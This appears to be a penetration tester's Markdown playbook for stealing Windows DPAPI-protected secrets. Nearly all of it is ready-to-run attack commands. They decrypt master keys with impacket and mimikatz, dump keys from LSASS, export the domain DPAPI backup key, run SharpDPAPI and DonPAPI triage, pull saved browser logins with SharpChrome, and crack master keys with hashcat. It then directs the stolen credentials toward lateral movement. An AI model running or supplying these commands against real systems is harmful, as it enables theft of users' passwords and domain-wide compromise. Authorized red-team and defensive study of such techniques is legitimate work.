# DPAPI

## Before I start
- [ ] The blobs: Microsoft\Credentials and Microsoft\Vault under a user's AppData, .rdg files, and the browsers' Login Data; a blob starts with the bytes 01 00 00 00
- [ ] The master keys: C:\Users\<TargetUser>\AppData\Roaming\Microsoft\Protect\THE-SID\THE-GUID, hidden, so -Force
- [ ] Which key a blob wants: mimikatz's dpapi::cred /in:THE-CREDENTIAL prints its guidMasterKey
- [ ] The basics, for the user I am: :Pb windows-creds

## With the user's password or NT hash, offline
At the pwn-broker prompt: tool install impacket.
THE-MASTERKEY and THE-CREDENTIAL sent back into loot/, then on Kali:
impacket-dpapi masterkey -file THE-MASTERKEY -sid THE-SID -password '<Password>'
impacket-dpapi masterkey -file THE-MASTERKEY -sid THE-SID -key 0x<Hash>
impacket-dpapi credential -file THE-CREDENTIAL -key THE-KEY
- [ ] THE-KEY is the Decrypted key line the masterkey command printed
- [ ] Plain text in the output: saved RDP logins, Credential Manager entries and service accounts, each tried everywhere: :Pb lateral-movement

## As the user, in their session
The DC decrypts my own master key for me over RPC.
At the pwn-broker prompt:
tool install mimikatz
serve
serve files mimikatz
SharpDPAPI.exe and SharpChrome.exe are built from https://github.com/GhostPack/SharpDPAPI, which publishes no binary, and put in the target's upload/ folder.
On the Windows host:
- [ ] Each fetched with the line serve files gives
.\mimikatz.exe "dpapi::masterkey /in:C:\Users\<Username>\AppData\Roaming\Microsoft\Protect\THE-SID\THE-GUID /rpc" "exit"
.\SharpDPAPI.exe triage /rpc
- [ ] triage covers credentials, vaults, .rdg files and certificates at once

## As a local administrator, for other users
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
- [ ] The master keys of every logged-on user, out of LSASS: their blobs decrypted with /masterkey:
.\SharpDPAPI.exe machinetriage
- [ ] The machine's own blobs as well, as SYSTEM

## As a domain administrator
The domain's backup key, exported once, decrypts every domain user's master keys from then on.
.\mimikatz.exe "lsadump::backupkeys /system:<DCHost> /export" "exit"
.\SharpDPAPI.exe backupkey /server:<DCHost> /file:key.pvk
.\SharpDPAPI.exe triage /server:<Hostname>.<Domain> /pvk:key.pvk

## From Kali, as an administrator of the host
DonPAPI, from https://github.com/login-securite/DonPAPI:
pipx install donpapi
donpapi collect -t <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'

## Browsers
.\SharpChrome.exe logins /unprotect
.\SharpChrome.exe logins /password:<Password>
- [ ] A current Chrome: its Local State file as well, since the app-bound key is there

## The user's password, from a master key
On Kali, with a master key file in loot/:
DPAPImk2john -S THE-SID -mk THE-MASTERKEY -c domain1607+ > dpapi.hash
hashcat -m 15910 dpapi.hash /usr/share/wordlists/rockyou.txt
- [ ] -c domain1607+ and 15910 are a domain user on Windows 10 1607 or later; -c local and -c domain1607- go with 15900; 15300 and 15310 are the same pair for the old version 1 keys
- [ ] On the Windows host, DPAPISnoop, built from https://github.com/leftp/DPAPISnoop, prints the same hashes for the master keys it finds, and its README gives the mode for each
- [ ] Decryption fails with the right key: the application added entropy of its own, as Outlook and VPN clients do, which mimikatz takes as /entropy:

## Next
- [ ] Every credential recovered, tried for reuse: :Pb windows-creds
- [ ] Administrator and service accounts tried on WinRM and RDP on every host I can reach: :Pb lateral-movement
